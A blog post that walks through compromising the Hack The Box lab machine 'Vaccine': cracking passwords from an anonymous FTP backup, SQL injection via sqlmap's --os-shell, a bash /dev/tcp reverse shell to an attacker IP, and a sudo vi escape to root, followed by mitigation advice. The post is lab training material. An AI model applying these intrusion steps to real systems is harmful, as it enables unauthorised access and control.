+++
title = "Hack The Box - Vaccine"
date = 2025-05-30

[taxonomies]
tags = ["hackthebox", "ftp", "sql", "sql injection", "reverse shell", "privesc"]
+++

[![TODO](/pictures/articles/htb/vaccine/00-cover.png)](https://www.hackthebox.com/achievement/machine/447801/289)

**Vaccine** is a Linux machine built to demonstrate the importance
of enumeration, and the dangers of chaining multiple vulnerabilities together
such as SQL injection, password hash cracking, anonymous guest access
and session cookie stealing.


<!-- more -->


## Enumeration

<!-- Enumeration {{{-->

The [nmap](https://nmap.org/) scan reveals the target machine has port 21
([FTP](https://en.wikipedia.org/wiki/File_Transfer_Protocol)),
port 22 ([SSH](https://en.wikipedia.org/wiki/Secure_Shell)), and
port 80 ([HTTP](https://en.wikipedia.org/wiki/HTTP)) open.

![a](/pictures/articles/htb/vaccine/01-nmap.png)

- `-sC`: Script scan
- `-sV`: Version detection

The webpage only presents a single login page which, for now, cannot be
bypassed.

![a](/pictures/articles/htb/vaccine/02-login.png)

There's also an FTP service running with the target machine that is allowing
anonymous login. The username should be `anonymous` and the corresponding
password is arbitrary.

![a](/pictures/articles/htb/vaccine/03-ftp-connect.png)

After logging in, the `dir` command can be used to list the available files.

There's only one file on the share, named `backup.zip`, which can be retrieved
using the `get backup.zip` command.

To exit the FTP session, issue the `exit` command.

![a](/pictures/articles/htb/vaccine/04-ftp-get.png)

`backup.zip` then needs to be extracted however, it is password-protected.

![a](/pictures/articles/htb/vaccine/05-unzip.png)

To crack the password, its hash needs to be extracted first from the encrypted
ZIP archive using `zip2john`.

![a](/pictures/articles/htb/vaccine/06-zip2john.png)

Then the extracted hash can be checked against the famous `rockyou` wordlist
using [John the Ripper](https://www.openwall.com/john/).

`john` shows that the password to unlock the ZIP is `741852963`.

![a](/pictures/articles/htb/vaccine/07-john-hashcrack.png)

The ZIP contains 2 files that can be investigated further.

![a](/pictures/articles/htb/vaccine/08-unzip.png)

[grep](https://en.wikipedia.org/wiki/Grep)ping `index.php` for `passw` reveals
a password hash stored for the `admin` user.

The found hash can be stored in a file for later use.

![a](/pictures/articles/htb/vaccine/09-pass-hash.png)

[hashID](https://psypanda.github.io/hashID/) confirms that it is indeed most
likely an [MD5](https://en.wikipedia.org/wiki/MD5) hash.

![a](/pictures/articles/htb/vaccine/10-hashid.png)

This hash can then be checked against the `rockyou` wordlist using `hashcat`.

![a](/pictures/articles/htb/vaccine/11-hashcat.png)

- `-a 0`: Dictionary attack mode
- `-m 0`: MD5 hash type

`hashcat` has cracked the hash and found the password `qwerty789`.

![a](/pictures/articles/htb/vaccine/12-hashcat-result.png)

It is now possible to log in to the website and enumerate its dashboard.

![a](/pictures/articles/htb/vaccine/13-login.png)

<!-- }}} -->

## Foothold

<!-- Foothold {{{-->

Upon running a search query, it reveals that the dashboard may actually be
connected with a backend database.

![a](/pictures/articles/htb/vaccine/14-test-query.png)

Intercepting the search query request with Burp Suite shows that there is a PHP
Session ID (`PHPSESSID`) being passed to the database in a form of a cookie.

![a](/pictures/articles/htb/vaccine/15-cookie.png)

The search query can be investigated with
[sqlmap](https://github.com/sqlmapproject/sqlmap) if it is SQL injectable.

![a](/pictures/articles/htb/vaccine/16-sqlmap.png)

- `u`: Target URL
- `--cookie`: HTTP header cookie value

`sqlmap` in its output displays multiple possible payloads to perform an
SQL injection.

To exploit the vulnerability, `sqlmap` should be called again but this time with
the additional `--os-shell` option to conclude in a shell.

![a](/pictures/articles/htb/vaccine/17-sqlmap-res.png)

The spawned `os-shell` is not so stable so it needs an additional payload
to make it work better.

To receive this incoming connection, a [netcat](https://en.wikipedia.org/wiki/Netcat)
should be set up listening an arbitrary port (e.g. `1234`).

![a](/pictures/articles/htb/vaccine/18-netcat.png)

The following Bash one-liner will initiate a connection from target back to the
attacker machine.

![a](/pictures/articles/htb/vaccine/19-payload.png)

- `bash`: Invoke a Bash shell
- `-c`: Execute the command that follows
- `bash -i`: Invoke another Bash shell instance
- `>&`: Redirect `stdout` and `stderr` to the specified location
- `/dev/tcp/10.10.15.127/1234`: Initiate a TCP connection to the specified
  address
- `0>&1`: Redirect `stdin` to `stdout`

The [netcat](https://en.wikipedia.org/wiki/Netcat)listener has successfully
received the connection resulting in a reverse shell.

![a](/pictures/articles/htb/vaccine/20-reverse-shell.png)

This shell isn't really stable either, it is disconnecting randomly, but it can
be utilized to look around on the system and retrieve the user flag.

![a](/pictures/articles/htb/vaccine/21-user-flag.png)

<!-- }}} -->

## Privilege escalation

<!-- Privilege escalation {{{-->

While exploring the web server's dedicated directories,
a password stored in clear text was discovered in a PHP file.

![a](/pictures/articles/htb/vaccine/22-user-password.png)

`sudo -l` shows that the current `postgres` user can launch `/bin/vi` as sudo to
edit a designated configuration file (`pg_hba.conf`).

![a](/pictures/articles/htb/vaccine/23-sudo-l.png)

According to [GTFOBins](https://gtfobins.github.io/gtfobins/vi/#sudo)
there are multiple ways to break out from restricted environments by spawning an
interactive system shell.

One way is to open the configuration file with `vi` as `sudo`.

![a](/pictures/articles/htb/vaccine/24-vi-open.png)

Set the shell to `/bin/sh`.

![a](/pictures/articles/htb/vaccine/25-vi.png)

And then issue the `shell` command.

![a](/pictures/articles/htb/vaccine/26-vi.png)

After executing the commands, a `root` shell is spawned and the `root` flag can
be retrieved from the `/root` directory.

![a](/pictures/articles/htb/vaccine/27-root-flag.png)

By achieving root privileges, the machine is
[pwned](https://www.hackthebox.com/achievement/machine/447801/289).

<!-- }}} -->

## Mitigation

<!-- Mitigation {{{-->

1. Secure FTP Service
    - Disable anonymous logins and require authentication
    - Replace FTP with more secure protocols such as STFP

2. Web Application Security
    - Implement multi factor authentication mechanisms

3. SQL injection
    - Validate and sanitize all user inputs
    - Use prepared statements and parameterized queries to separate SQL code
    from data

4. Reverse Shell Prevention
    - Monitor and restrict outbound network traffic for patterns indicating
    reverse shell attacks

5. Sudo privileges
    - Implement the principle of least privilege when assigning sudo rights

6. Restrict configuration files
    - Ensure configuration files are accessible only for authorized users

7. Secure Shell Access
    - Restrict shell commands that can be executed
    - Monitor shell activity for suspicious behaviour

<!-- }}} -->
